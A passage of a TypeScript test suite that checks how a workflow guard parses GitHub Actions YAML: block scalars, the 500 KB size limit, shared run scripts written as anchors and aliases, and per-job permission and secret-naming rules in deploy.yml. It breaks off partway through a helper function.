    // Quoted items whole, and plain ones holding a : with no blank after it, still read.
    expect(ci(needs, `    needs: [secrets, "audit", 'audit']\n`)).toEqual([])
    expect(ci(branches, '    branches: [main, a:b]\n')).toEqual([])
    // An indentation indicator in ci.yml, though its folded scalars stay.
    const audit = '      - run: npm audit signatures\n'
    const INDICATOR = `${CI}: DPW-02 gives no block scalar an indentation indicator, which sets an indent workflow.ts doesn’t take`
    for (const indicator of ['|2', '|2-', '|-2', '>1', '>-2']) {
      expect(ci(audit, `      - run: ${indicator}\n          npm audit signatures\n`), indicator).toEqual([INDICATOR])
    }
    expect(ci(audit, '      - run: >-\n          npm audit signatures\n')).toEqual([])
  })

  it('finds a block scalar in deploy.yml that isn’t literal', () => {
    const LITERAL = `${DEPLOY}: DPW-02 writes every block scalar literal (|, |- or |+), never folded (>) or with an indentation indicator`
    const mark = `        id: mark\n        if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n        run: |\n`
    const as = (indicator: string) =>
      permissionFindings(plant(mark, mark.replace('run: |\n', `run: ${indicator}\n`), job('nonprod')))
    for (const indicator of ['>', '>-', '|2', '|2-', '|-2']) expect(as(indicator), indicator).toEqual([LITERAL])
    for (const indicator of ['|-', '|+', '| # a comment']) expect(as(indicator), indicator).toEqual([])
  })

  it('holds the repository', () => {
    // GitHub sets GITHUB_REPOSITORY in every CI run, so there this repository's own name is always held.
    if (process.env.GITHUB_ACTIONS === 'true') expect(ownRepository()).toBeDefined()
    expect(permissionFindings(workflows, ownRepository() ?? '')).toEqual([])
  })

  // Round 11: GitHub starts no run of a workflow file over 500 KB, and deploy.yml had grown past it with no rule
  // reading a workflow's size, while CI stayed green because deploy.yml runs only on main or a dispatch.
  it('holds every workflow to GitHub’s 500 KB (round 11)', () => {
    const SIZE = (path: string) =>
      `${path}: DPW-02 is at most ${WORKFLOW_BYTES} bytes, since GitHub starts no run of a workflow file over 500 KB`
    const ci = readRepoFile(CI)
    const padded = (bytes: number) => `${ci}${'#'.repeat(bytes - Buffer.byteLength(ci) - 1)}\n`
    expect(workflowSizeFindings(withText(CI, padded(WORKFLOW_BYTES + 1))).filter(each => each.startsWith(CI))).toEqual([
      SIZE(CI),
    ])
    expect(workflowSizeFindings(withText(CI, padded(WORKFLOW_BYTES))).filter(each => each.startsWith(CI))).toEqual([])
    // A character over one byte counts as its UTF-8 bytes.
    const wide = `${ci}#${'é'.repeat(Math.ceil((WORKFLOW_BYTES - Buffer.byteLength(ci)) / 2))}\n`
    expect(wide.length).toBeLessThan(WORKFLOW_BYTES)
    expect(workflowSizeFindings(withText(CI, wide)).filter(each => each.startsWith(CI))).toEqual([SIZE(CI)])
    // Round 13: deploy.yml is under the limit as committed, each run several steps run whole written once and
    // aliased (RUN_ANCHORS), while its expansion, every shared run written out as GitHub runs it, is over it, so
    // the shared runs are what keep it under (TECH-SPEC T24 item 20). Every workflow is within it.
    expect(Buffer.byteLength(committedDeploy)).toBeLessThanOrEqual(WORKFLOW_BYTES)
    expect(Buffer.byteLength(deployText)).toBeGreaterThan(WORKFLOW_BYTES)
    for (const [path, text] of workflows) expect(workflowSizeFindings(new Map([[path, text]])), path).toEqual([])
    expect(workflowSizeFindings(workflows)).toEqual([])
    // GitHub counts the limit on the file as stored, but its C# workflow parser counts what it reads, every alias
    // resolved, against two budgets of its own: each string at about twice its length against a 10 MiB result
    // budget, and each event against a 50,000-event cap, where an alias of a scalar replays one (deploy.yml reads
    // as 2,772 events either way). Two million bytes of expansion is about 4 MB charged, far inside the first.
    const EXPANDED_BYTES = 2_000_000
    expect(Buffer.byteLength(deployText)).toBeLessThanOrEqual(EXPANDED_BYTES)
  })
})

// Round 13: GitHub starts no run of a workflow file over 500 KB, so deploy.yml may hold a run several steps run
// whole once, anchored on the first (run: &name |), with each later step aliasing it (run: *name). workflow.ts
// reads exactly those two forms on a step's run: line and resolves each alias as YAML does, to the latest earlier
// anchor of its name, so every rule reads the text GitHub runs; every other node property stays a shape it
// refuses (DPW-02).
describe('workflow.ts reads a shared run as GitHub does (DPW-02, round 13)', () => {
  const head = ['name: x', 'on: push', 'jobs:', '  a:', '    runs-on: ubuntu-24.04', '    steps:']
  const lines = (...each: string[]) => `${each.join('\n')}\n`
  const SHARED = lines(
    ...head,
    '      - name: First',
    '        env:',
    '          X: y',
    '        # Shared run &one: written once here, and run as written by b (Second).',
    '        run: &one |',
    '          set -euo pipefail',
    '          # a comment line of the run',
    '',
    '          echo "$X"',
    '',
    '',
    '  b:',
    '    runs-on: ubuntu-24.04',
    '    steps:',
    '      - name: Second',
    '        # Shared run *one: the text written in a (First).',
    '        run: *one',
    '      - name: Third',
    '        run: echo done',
  )
  const CONTENT = ['          set -euo pipefail', '          # a comment line of the run', '', '          echo "$X"']
  const WRITTEN = lines(
    ...head,
    '      - name: First',
    '        env:',
    '          X: y',
    '        run: |',
    ...CONTENT,
    '',
    '',
    '  b:',
    '    runs-on: ubuntu-24.04',
    '    steps:',
    '      - name: Second',
    '        run: |',
    ...CONTENT,
    '      - name: Third',
    '        run: echo done',
  )
  const index = (text: string, line: string, from = 0) => {
    const at = text.split('\n').indexOf(line, from)
    if (at < 0) throw new Error(`no line ${line}`)
    return at
  }

  it('reads an alias as its anchor’s text, at the aliasing step, with the shared-run comments dropped', () => {
    const [a, b] = workflowJobs(SHARED).map(each => parsedSteps(each))
    const first = a?.[0]
    const second = b?.[0]
    if (first === undefined || second === undefined) throw new Error('the planted workflow has both steps')
    expect(first.run).toBe('set -euo pipefail\n# a comment line of the run\n\necho "$X"')
    expect(second.run).toBe(first.run)
    expect(second.lines).toEqual(['      - name: Second', '        run: |', ...CONTENT])
    expect(first.lines).toEqual(['      - name: First', '        env:', '          X: y', '        run: |', ...CONTENT])
    expect(literalRun(first) && literalRun(second)).toBe(true)
    // The anchor's content is content, never a YAML line or a comment.
    const content = SHARED.split('\n').flatMap((line, i) => (/^ {10}(?:set|#|echo)/.test(line) ? [i] : []))
    expect(content).toHaveLength(3)
    const yaml = new Set(yamlLines(SHARED).map(line => line.index))
    expect(content.filter(i => yaml.has(i) || commentLines(SHARED).includes(i))).toEqual([])
    expect(shapeProblems(SHARED)).toEqual([])
    // The expansion is the hand-written-out file, is idempotent, and is the identity on a file with no shared run.
    expect(expandRunAliases(SHARED)).toBe(WRITTEN)
    expect(expandRunAliases(expandRunAliases(SHARED))).toBe(WRITTEN)
    expect(expandRunAliases(WRITTEN)).toBe(WRITTEN)
    const anchor = index(SHARED, '        run: &one |')
    const alias = index(SHARED, '        run: *one')
    const shared = runAnchors(SHARED)
    expect(shared.anchors.map(({ line, name, job, step, index: at }) => ({ line, name, job, step, at }))).toEqual([
      { line: anchor, name: 'one', job: 'a', step: 'First', at: 0 },
    ])
    expect(shared.anchors[0]?.text).toBe(first.run)
    expect(shared.aliases).toEqual([{ line: alias, name: 'one', job: 'b', step: 'Second', index: 0, anchor }])
    expect(shared.comments).toEqual([
      { lines: [anchor - 1], of: anchor },
      { lines: [alias - 1], of: alias },
    ])
    expect(shared.problems).toEqual([])
  })

  it('reads an anchor only as run: &name | (no |-, |+, > or |2), its block’s content still content', () => {
    for (const header of ['|-', '|+', '>', '|2']) {
      const text = lines(
        ...head,
        '      - name: First',
        `        run: &one ${header}`,
        '          # content',
        '          echo one',
      )
      expect(shapeProblems(text), header).toEqual([7])
      expect(commentLines(text), header).toEqual([])
      expect(
        yamlLines(text).map(line => line.index),
        header,
      ).toEqual([0, 1, 2, 3, 4, 5, 6, 7])
      expect(literalProblems(text), header).toEqual(header === '>' || header === '|2' ? [7] : [])
      expect(indicatorProblems(text), header).toEqual(header === '|2' ? [7] : [])
      expect(runAnchors(text).anchors, header).toEqual([])
    }
  })

  it('refuses a second anchor of a name, and reads a later alias as the latest', () => {
    const text = lines(
      ...head,
      '      - name: First',
      '        run: &one |',
      '          echo one',
      '      - name: Second',
      '        run: &one |',
      '          echo two',
      '      - name: Third',
      '        run: *one',
    )
    expect(shapeProblems(text)).toEqual([index(text, '        run: &one |', 9)])
    const steps = parsedSteps(workflowJobs(text)[0] ?? ({} as never))
    expect(steps.map(step => step.run)).toEqual(['echo one', 'echo two', 'echo two'])
  })

  it('refuses an alias before its anchor and an alias of no anchor, and reads each as written', () => {
    const text = lines(
      ...head,
      '      - name: First',
      '        run: *one',
      '      - name: Second',
      '        run: &one |',
      '          echo one',
      '      - name: Third',
      '        run: *two',
    )
    expect(shapeProblems(text)).toEqual([index(text, '        run: *one'), index(text, '        run: *two')])
    const steps = parsedSteps(workflowJobs(text)[0] ?? ({} as never))
    expect(steps.map(step => step.run)).toEqual(['*one', 'echo one', '*two'])
    expect(expandRunAliases(text)).toBe(text.replace('run: &one |', 'run: |'))
  })

  it('refuses every other spelling of either form, a comment, a tag or a dash form among them', () => {
    const anchored = [...head, '      - name: First', '        run: &one |', '          echo one']
    for (const variant of [
      ['      - name: Second', '        run: *one # c'],
      ['      - name: Second', '        run: &two | # c', '          echo two'],
      ['      - name: Second', '        run: &two !!str |', '          echo two'],
      ['      - name: Second', '        run: &Two |', '          echo two'],
      ['      - name: Second', '        run: &t_o |', '          echo two'],
      ['      - name: Second', '        run: &2o |', '          echo two'],
      ['      - name: Second', '        run: &two: |', '          echo two'],
      ['      - name: Second', '        run: &two  |', '          echo two'],
      ['      - name: Second', '        run: *one ', `        if: \${{ true }}`],
      ['      - run: &two |', '          echo two'],
      ['      - run: *one'],
    ]) {
      const text = lines(...anchored, ...variant)
      const at = anchored.length + variant.findIndex(line => /run: [&*]/.test(line))
      expect(shapeProblems(text), variant.join('\n')).toContain(at)
    }
  })

  it('refuses anything deeper than the step’s keys under an alias, a comment included', () => {
    const anchored = [
      ...head,
      '      - name: First',
      '        run: &one |',
      '          echo one',
      '      - name: Second',
    ]
    const alias = anchored.length
    const below = (...rest: string[]) =>
      shapeProblems(lines(...anchored, '        run: *one', ...rest, '      - name: Third', '        run: echo three'))
    expect(below('        # at eight', '            # at twelve')).toEqual([alias])
    expect(below('        # at eight', '            deeper: x')).toContain(alias)
    expect(below('          # at ten')).toEqual([alias])
    expect(below('      # at six')).toEqual([])
    expect(below('        # at eight')).toEqual([])
    expect(below('')).toEqual([])
  })

  it('refuses a node property anywhere but a step’s run, and a merge key or other mapping as a sequence item', () => {
    const run = ['      - name: First', '        run: &one |', '          echo one']
    for (const [planted, line] of [
      [[...head, '      - name: First', '        env:', '          X: &e y', '        run: echo'], '          X: &e y'],
      [[...head, '      - uses: actions/checkout@v5', '        with:', '          a: *e'], '          a: *e'],
      [
        [...head, '      - name: First', `        if: &i \${{ true }}`, '        run: echo'],
        `        if: &i \${{ true }}`,
      ],
      [
        [...head, '      - name: First', '        uses: &u actions/checkout@v5'],
        '        uses: &u actions/checkout@v5',
      ],
      [['name: x', 'on: push', 'jobs:', '  a:', '    concurrency: *g', '    steps:', ...run], '    concurrency: *g'],
      [[...head, '      - &s', '        name: x', '        run: echo x'], '      - &s'],
      [[...head, ...run, '      - <<: *s'], '      - <<: *s'],
      [[...head, ...run, '      - a.b: c'], '      - a.b: c'],
      [[...head, ...run, '      - x y: z'], '      - x y: z'],
      [
        ['name: x', 'on: push', 'jobs:', '  a:', '    strategy:', '      matrix:', '        run: &m |', '          a'],
        '        run: &m |',
      ],
      [
        [...head, ...run, '      - name: Second', '        env:', '          X: &one two', '        run: *one'],
        '          X: &one two',
      ],
    ] as const) {
      const text = lines(...planted)
      expect(shapeProblems(text), line).toContain(index(text, line))
    }
    // The non-run anchor of the same name is refused, so the alias after it can read only the run's anchor.
    const between = lines(
      ...head,
      ...run,
      '      - name: Second',
      '        env:',
      '          X: &one two',
      '        run: echo',
    )
    expect(runAnchors(between).anchors.map(anchor => anchor.line)).toEqual([7])
    // A plain item with a : that isn't followed by a blank, or after a comment, stays a scalar.
    expect(shapeProblems(lines(...head, ...run, '      - https://x', '      - a # b: c'))).toEqual([])
  })

  it('finds no shared run in a comment or in a block scalar’s content', () => {
    const text = lines(
      'name: x',
      'on: push',
      'jobs:',
      '  a:',
      '    env:',
      '      NOTE: |',
      '        run: *one',
      '    steps:',
      '      - name: First',
      '        # run: *one',
      '        run: |',
      '          run: *one',
      '          echo one',
    )
    expect(runAnchors(text)).toEqual({ anchors: [], aliases: [], comments: [], problems: [] })
    expect(expandRunAliases(text)).toBe(text)
    expect(parsedSteps(workflowJobs(text)[0] ?? ({} as never))[0]?.run).toBe('run: *one\necho one')
  })

  it('drops only the comment directly above a shared run, at eight spaces, naming its own sigil and name', () => {
    const text = lines(
      ...head,
      '      - name: First',
      '        # A note of the step’s own, kept.',
      '        # Shared run &one: written once here, and run as written by a (Second), a (Third) and a (Fourth).',
      '        run: &one |',
      '          echo one',
      '      - name: Second',
      '        # Shared run *two: the text written in a (First).',
      '        # Shared run *one: the text written in a (First).',
      '        run: *one',
      '      - name: Third',
      '        # Shared run *one: the text written in a (First).',
      '        env:',
      '          X: y',
      '        run: *one',
      '      - name: Fourth',
      '      # Shared run *one: the text written in a (First).',
      '        run: *one',
    )
    expect(expandRunAliases(text)).toBe(
      lines(
        ...head,
        '      - name: First',
        '        # A note of the step’s own, kept.',
        '        run: |',
        '          echo one',
        '      - name: Second',
        '        # Shared run *two: the text written in a (First).',
        '        run: |',
        '          echo one',
        '      - name: Third',
        '        # Shared run *one: the text written in a (First).',
        '        env:',
        '          X: y',
        '        run: |',
        '          echo one',
        '      - name: Fourth',
        '      # Shared run *one: the text written in a (First).',
        '        run: |',
        '          echo one',
      ),
    )
    expect(runAnchors(text).comments).toEqual([
      { lines: [8], of: 9 },
      { lines: [13], of: 14 },
    ])
  })
})

// Round 13: deploy.yml's shared runs, as DPW-02 holds them, and the rules reading each shared run in every job
// that runs it. The cases plant into deploy.yml laid out as realiased() lays it out (every RUN_ANCHORS text two or
// more steps run anchored on the first and aliased at the rest), which is the committed file's own layout.
describe('DPW-02: deploy.yml’s shared runs (round 13)', () => {
  let aliasedCache: string | undefined
  const aliased = (): string => {
    aliasedCache ??= realiased(deployText)
    if (aliasedCache === undefined) throw new Error('deploy.yml has a shared layout')
    return aliasedCache
  }
  const ID_TOKEN = `${DEPLOY}: DPW-02 only the five environment jobs ask for an id-token, and nothing asks for write-all`
  // A step's place, and the lines of an anchor's or an alias's shared run, its comment first.
  const placeOf = (job: string, step: string): StepPlace => ({ job, step })
  const anchorLines = (name: string, aliasedBy: readonly StepPlace[]) =>
    [...sharedRunComment('anchor', name, aliasedBy), `        run: &${name} |`].join('\n')
  const aliasLines = (name: string, anchor: StepPlace) =>
    [...sharedRunComment('alias', name, [anchor]), `        run: *${name}`].join('\n')
  const writtenOut = (name: string) => `        run: |\n${indent(RUN_ANCHORS()[name]?.text ?? '', 10)}`
  // A smoke job's Smoke step's run, written whole.
  const smokeWritten = (id: 'smoke-nonprod' | 'smoke-prod') => `        run: |\n${indent(smokeRun(id), 10)}\n`
  // The aliased file with the alias of a name in a job written out again as the text it runs (one line of it
  // changed, if asked).
  function writtenAgain(text: string, name: string, job: string, change?: readonly [string, string]): string {
    const shared = runAnchors(text)
    const alias = shared.aliases.find(each => each.name === name && each.job === job)
    if (alias === undefined) throw new Error(`no alias of ${name} in ${job}`)
    const from = shared.comments.find(each => each.of === alias.line)?.lines[0] ?? alias.line
    const lines = text.split('\n')
    const run = change === undefined ? writtenOut(name) : edited(writtenOut(name), change[0], change[1])
    return [...lines.slice(0, from), run, ...lines.slice(alias.line + 1)].join('\n')
  }
  const CLI_FETCH_ALIASED_BY = [
    placeOf('rollback-nonprod', 'The pinned CDK CLI'),
    placeOf('prod-plan', 'The pinned CDK CLI'),
    placeOf('prod', 'The pinned CDK CLI'),
    placeOf('rollback-prod', 'The pinned CDK CLI'),
  ]
  const CLI_FETCH_ANCHOR = anchorLines('cli-fetch', CLI_FETCH_ALIASED_BY)
  // A line added at the top of cli-fetch's anchored text in nonprod, which every aliasing step then runs.
  const atCliFetch = (line: string) =>
    edited(aliased(), `${CLI_FETCH_ANCHOR}\n`, `${CLI_FETCH_ANCHOR}\n          ${line}\n`)

  it('names each shared text by a name of its own, of at least 1,000 bytes, that two or more steps run whole', () => {
    const runs = workflowJobs(deployText).flatMap(each => parsedSteps(each).map(step => step.run))
    for (const [name, { text }] of Object.entries(RUN_ANCHORS())) {
      expect(name, name).toMatch(/^[a-z][a-z0-9-]*$/)
      expect(name, name).not.toMatch(/uses/i)
      expect(Buffer.byteLength(text), name).toBeGreaterThanOrEqual(ALIAS_MIN_BYTES)
      expect(runs.filter(run => run === text).length, name).toBeGreaterThanOrEqual(2)
    }
    expect(new Set(Object.values(RUN_ANCHORS()).map(entry => entry.text)).size).toBe(Object.keys(RUN_ANCHORS()).length)
  })

  // The committed file is exactly that layout: every RUN_ANCHORS text two or more steps run stored once, nothing
  // else aliased, and every shared-run comment as sharedRunComment() writes it. A repeat outside RUN_ANCHORS stays
  // written out until a reviewed entry names it.
  it('holds deploy.yml as committed in that layout', () => {
    expect(runAnchors(committedDeploy).aliases.length).toBeGreaterThan(0)
    expect(aliased()).toBe(committedDeploy)
  })

  it('holds deploy.yml laid out with its shared runs aliased, its expansion the file as the rules read it', () => {
    const text = aliased()
    expect(expandRunAliases(text)).toBe(deployText)
    expect(Buffer.byteLength(text)).toBeLessThan(Buffer.byteLength(deployText))
    const shared = runAnchors(text)
    expect(shared.anchors.map(anchor => anchor.name).sort()).toEqual(Object.keys(RUN_ANCHORS()).sort())
    expect(shared.problems).toEqual([])
    const planted = withText(DEPLOY, text)
    expect(permissionFindings(planted, ownRepository() ?? '')).toEqual([])
    expect(credentialedCodeFindings(planted, manifests, lockfile)).toEqual([])
    expect(deployStepFindings(planted)).toEqual([])
    expect(maskingFindings(planted)).toEqual([])
    expect(timeoutAndGroupFindings(planted)).toEqual([])
    expect(actionPinFindings(planted)).toEqual([])
    expect(deployPinProblems(text)).toEqual([])
  }, 60_000)

  it('refuses an anchor no step aliases', () => {
    const unread = writtenAgain(aliased(), 'image-unpack', 'prod')
    const name = placeOf('prod', 'Check and unpack the image')
    const planted = edited(unread, anchorLines('image-unpack', [name]), anchorLines('image-unpack', []))
    expect(runAnchors(planted).aliases.filter(alias => alias.name === 'image-unpack')).toEqual([])
    expect(permissionFindings(withText(DEPLOY, planted))).toEqual([SHARED_RUNS])
  })

  it('refuses a shared text under 1,000 bytes, and a name RUN_ANCHORS doesn’t give that text', () => {
    // Two Smoke steps share smoke-nonprod's text under a name of their own.
    const smoke = smokeRun('smoke-nonprod')
    expect(Buffer.byteLength(smoke)).toBeLessThan(ALIAS_MIN_BYTES)
    const written = `        run: |\n${indent(smoke, 10)}\n`
    const anchored = edited(
      aliased(),
      written,
      `${anchorLines('smoke', [placeOf('smoke-prod', 'Smoke')])}\n${indent(smoke, 10)}\n`,
      job('smoke-nonprod'),
    )
    const planted = edited(
      anchored,
      `        run: |\n${indent(smokeRun('smoke-prod'), 10)}\n`,
      `${aliasLines('smoke', placeOf('smoke-nonprod', 'Smoke'))}\n`,
      job('smoke-prod'),
    )
    expect(runAnchors(planted).aliases.filter(alias => alias.name === 'smoke')).toHaveLength(1)
    expect(permissionFindings(withText(DEPLOY, planted))).toEqual([SHARED_RUNS])
    // Named with that text, the size alone refuses it.
    expect(sharedRunsHold(planted, { ...RUN_ANCHORS(), smoke: { text: smoke } })).toBe(false)
    expect(sharedRunsHold(aliased(), { ...RUN_ANCHORS(), smoke: { text: smoke } })).toBe(true)
  })

  it('refuses a name over another entry’s text, which PINNED_RUNS alone would pass', () => {
    const swapped = aliased().replace(/([&*])cli-(fetch|check)\b/g, (_, sigil: string, which: string) =>
      which === 'fetch' ? `${sigil}cli-check` : `${sigil}cli-fetch`,
    )
    expect(runAnchors(swapped).anchors.find(anchor => anchor.name === 'cli-check')?.text).toBe(CLI_FETCH)
    const planted = withText(DEPLOY, swapped)
    expect(permissionFindings(planted)).toEqual([SHARED_RUNS])
    expect(credentialedCodeFindings(planted, manifests, lockfile)).toEqual([])
  })

  it('refuses a shared-run comment missing, naming another step, gone stale or standing anywhere else', () => {
    const imageAlias = aliasLines('image-unpack', placeOf('nonprod', 'Check and unpack the image'))
    for (const planted of [
      // Missing above an alias.
      edited(aliased(), imageAlias, '        run: *image-unpack', job('prod')),
      // Naming another step than the anchor's.
      edited(aliased(), imageAlias, aliasLines('image-unpack', placeOf('nonprod', ARTIFACTS_STEP)), job('prod')),
      // Stale: an aliasing step written out again, its anchor's comment still naming it.
      writtenAgain(aliased(), 'cli-fetch', 'rollback-prod'),
      // Above a step that shares no run.
      edited(
        aliased(),
        '        run: |\n          set -euo pipefail\n',
        '        # Shared run: a note.\n        run: |\n          set -euo pipefail\n',
        job('smoke-nonprod'),
      ),
    ]) {
      expect(permissionFindings(withText(DEPLOY, planted))).toEqual([SHARED_RUNS])
    }
  })

  it('refuses a shared run in any other workflow, which DPW-04 still reads as written out', () => {
    const ci = workflows.get(CI) ?? ''
    const pins = PINS_STEP
    expect(ci).toContain(pins)
    const last = '      - run: scripts/check-schema-digest.sh\n'
    const planted = withText(
      CI,
      edited(
        edited(ci, pins, pins.replace('run: |', 'run: &pins |')),
        last,
        `${last}      - name: The pins again\n        run: *pins\n`,
      ),
    )
    expect(permissionFindings(planted)).toEqual([NO_SHARED_RUNS(CI)])
    expect(actionPinFindings(planted)).toEqual([])
  })

  it('refuses any other anchor, alias or merge key in deploy.yml as a block mapping it doesn’t read', () => {
    const env = '    env:\n      STAGE: nonprod\n'
    expect(permissionFindings(plant(env, `${env}      X: *x\n`, job('nonprod')))).toEqual([
      `${DEPLOY}: DPW-02 ${BLOCK_MAPPINGS}`,
      `${DEPLOY}: DPW-02 ${SHAPE}`,
    ])
    expect(
      permissionFindings(plant('      - name: Smoke\n', '      - <<: *s\n      - name: Smoke\n', job('smoke-prod'))),
    ).toEqual([`${DEPLOY}: DPW-02 ${BLOCK_MAPPINGS}`, `${DEPLOY}: DPW-02 ${SHAPE}`])
    // In any other workflow, a merge key or another mapping written as a step is a shape the reader refuses.
    const last = '      - run: scripts/check-schema-digest.sh\n'
    for (const step of ['      - <<: *s\n', '      - a.b: c\n']) {
      expect(permissionFindings(plant(last, `${last}${step}`, '', CI)), step).toEqual([`${CI}: DPW-02 ${SHAPE}`])
    }
  })

  it('refuses an alias of no anchor, which the expansion keeps as written', () => {
    const text = edited(aliased(), smokeWritten('smoke-prod'), '        run: *nothing\n', job('smoke-prod'))
    expect(runAnchors(expandRunAliases(text)).aliases).toHaveLength(1)
    expect(permissionFindings(withText(DEPLOY, text))).toEqual(
      expect.arrayContaining([EXPANDED_SHAPE, SHARED_RUNS, `${DEPLOY}: DPW-02 ${SHAPE}`]),
    )
  })

  // The rules that read lines by job read the expansion: a word in a shared run counts in every job that runs it.
  it('reads a shared run’s words in every job that runs it: the id-token, a group and a secret', () => {
    // cli-fetch's text, holding id-token, aliased in smoke-nonprod too.
    const tokened = edited(
      atCliFetch('# id-token'),
      smokeWritten('smoke-nonprod'),
      '        run: *cli-fetch\n',
      job('smoke-nonprod'),
    )
    expect(runAnchors(tokened).aliases.filter(alias => alias.job === 'smoke-nonprod')).toHaveLength(1)
    expect(permissionFindings(withText(DEPLOY, tokened))).toContain(ID_TOKEN)
    // A group named in the anchored text: each of the five jobs that run it.
    expect(timeoutAndGroupFindings(withText(DEPLOY, atCliFetch('# deploy-prod')))).toEqual(
      ['nonprod', 'rollback-nonprod', 'prod-plan', 'prod', 'rollback-prod'].map(
        id => `${DEPLOY}: DPW-05 ${id}: names deploy-nonprod or deploy-prod only as a deploy job's group`,
      ),
    )
    // A secret named in it, which the rollback jobs may not name.
    expect(maskingFindings(withText(DEPLOY, atCliFetch('# secrets.AWS_DIFF_ROLE')))).toEqual(
      expect.arrayContaining([
        `${DEPLOY}: DPW-07 rollback-nonprod: names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN`,
        `${DEPLOY}: DPW-07 rollback-prod: names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN`,
      ]),
    )
  })

  it('finds an edit at an anchor at every step that runs it, and one aliasing step written out again alone', () => {
    const pinned = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${PINNED_10}`
    const credentialed = (text: string) => credentialedCodeFindings(withText(DEPLOY, text), manifests, lockfile)
    expect(credentialed(atCliFetch('true'))).toEqual(
      expect.arrayContaining(
        ['nonprod', 'rollback-nonprod', 'prod-plan', 'prod', 'rollback-prod'].map(id =>
          pinned(`${id} (The pinned CDK CLI)`),
        ),
      ),
    )
    const changed = writtenAgain(aliased(), 'cli-fetch', 'prod', [
      '          # The runner reads',
      '          # The runner Reads',
    ])
    const found = credentialed(changed).filter(each => each.includes('(PINNED_RUNS)'))
    expect(found).toEqual([pinned('prod (The pinned CDK CLI)')])
    // asset-check's anchor, in synth, which no credential rule reads: a line added there is found at each of the
    // nine steps that run it, under DPW-10 in the credentialed jobs and DPW-13 in the synths.
    const header = '        run: &asset-check |\n'
    expect(aliased().split(header)).toHaveLength(2)
    const atAssetCheck = edited(aliased(), header, `${header}          true\n`)
    expect(credentialed(atAssetCheck)).toEqual(
      expect.arrayContaining(
        [
          'nonprod (Check the assembly)',
          'rollback-nonprod (Check the previous assembly)',
          'prod-plan (Check the assembly)',
          'prod-plan (Check the previous assembly)',
          'prod (Check the assembly)',
          'rollback-prod (Check the previous assembly)',
        ].map(pinned),
      ),
    )
    expect(releaseFindings(withText(DEPLOY, atAssetCheck))).toEqual(
      expect.arrayContaining(
        [
          "synth (Check the release's assembly)",
          "synth-previous-nonprod (Check nonprod's previous assembly)",
          "synth-previous-prod (Check prod's previous assembly)",
        ].map(where => `${DEPLOY}: DPW-13 ${where}: ${PINNED_13}`),
      ),
    )
  }, 60_000)

  // The pins proof runs before any of the repository's code and reads deploy.yml as stored, so it reads the
  // shared layout itself: an alias holds no uses:, and an anchored text is read line by line like any run.
  it('proves the pins over the shared layout as stored', () => {
    const text = aliased()
    expect(deployPinProblems(text)).toEqual([])
    const line = (planted: string, start: string) => planted.split('\n').findIndex(each => each.startsWith(start)) + 1
    const orphan = edited(text, smokeWritten('smoke-prod'), '        run: *nothing\n', job('smoke-prod'))
    expect(deployPinProblems(orphan)).toEqual([
      `line ${line(orphan, '        run: *nothing')}: in none of the shapes the workflow reader reads`,
    ])
    const checkout = `        uses: ${pinOf('actions/checkout')}`
    const anchoredUses = edited(text, `${checkout}\n`, checkout.replace('uses: ', 'uses: &co ').concat('\n'))
    expect(deployPinProblems(anchoredUses)).toEqual(
      expect.arrayContaining([expect.stringMatching(/in none of the shapes/), expect.stringMatching(/another shape/)]),
    )
    const aliasedUses = edited(text, `${checkout}\n`, '        uses: *co\n', job('build'))
    expect(deployPinProblems(aliasedUses)).toEqual(
      expect.arrayContaining([expect.stringMatching(/in none of the shapes/), expect.stringMatching(/another shape/)]),
    )
    const inAnchor = atCliFetch('# uses: x')
    expect(deployPinProblems(inAnchor)).toEqual([
      `line ${line(inAnchor, '          # uses: x')}: names uses in another shape than a step's pinned uses:`,
    ])
    const said = '        # Shared run &cli-fetch: written'
    const inComment = edited(text, said, said.replace(': written', ', which uses: nothing: written'))
    expect(deployPinProblems(inComment)).toEqual([
      `line ${line(inComment, said.replace(': written', ', which uses: nothing: written'))}: names uses in another shape than a step's pinned uses:`,
    ])
  })
})

// The harness's own proof: a rule that read deploy.yml's stored lines by job, where an aliased run sits in its
// anchor's job alone, fails differential(); and every reader of deploy.yml in the guard is listed with how it
// reads, so a new one is a reviewed entry, and jobSpans() takes only the expansion.
describe('DPW-02: every rule reads deploy.yml’s shared runs where they run (round 13)', () => {
  it('fails a rule that reads the stored file’s lines by job', () => {
    // The jobs whose lines, as stored, run cli-fetch's text: its anchor's job alone once it is shared.
    const runsCliFetch = (given: Texts): Finding[] => {
      const text = given.get(DEPLOY) ?? ''
      const head = /^ {10}# The pinned CDK CLI \(CLI_FETCH/
      let id = ''
      return text.split('\n').flatMap(line => {
        id = /^ {2}([\w-]+):$/.exec(line)?.[1] ?? id
        return head.test(line) ? [id] : []
      })
    }
    // Five steps run it, each in its own job; the committed file stores it once, in nonprod, and aliases it in the
    // other four.
    expect(runsCliFetch(withText(DEPLOY, deployText))).toEqual([
      'nonprod',
      'rollback-nonprod',
      'prod-plan',
      'prod',
      'rollback-prod',
    ])
    expect(runsCliFetch(workflows)).toEqual(['nonprod'])
    expect(() => differential('runsCliFetch', runsCliFetch)(workflows)).toThrow(/other layout/)
  })

  // Each function of deploy-workflow.ts that reads deploy.yml by its path: through jobsOf() (workflowJobs(), which
  // expands), through expandRunAliases(), and the file as stored only for what an alias can't change, with why.
  const DEPLOY_TEXT_READERS: Readonly<Record<string, { jobs?: true; expanded?: true; stored?: string }>> = {
    triggerFindings: { stored: 'its top-level on: (workflowTop()), where no alias can stand' },
    permissionFindings: {
      jobs: true,
      expanded: true,
      stored: 'its shape: top-level permissions, characters, escapes, if: lines, block mappings and the shared runs',
    },
    credentialJobFindings: { jobs: true },
    actionPinFindings: { expanded: true },
    timeoutAndGroupFindings: { jobs: true, expanded: true },
    deployStepFindings: { jobs: true },
    maskingFindings: { jobs: true, expanded: true },
    prodPathFindings: { jobs: true },
    gateFindings: { jobs: true },
    credentialedCodeFindings: {
      jobs: true,
      stored: 'its top-level keys (shapeOfJobsFindings()), where no alias can stand',
    },
    releaseFindings: {
      jobs: true,
      stored: 'words anywhere in the file, which an alias adds none of, its anchor holding them',
    },
    assetCheckFindings: { jobs: true },
  }
  // Each top-level declaration of a source text, by name, with its text up to the next.
  const declarations = (source: string): Map<string, string> => {
    const found = new Map<string, string>()
    let name: string | undefined
    let body: string[] = []
    for (const line of source.split('\n')) {
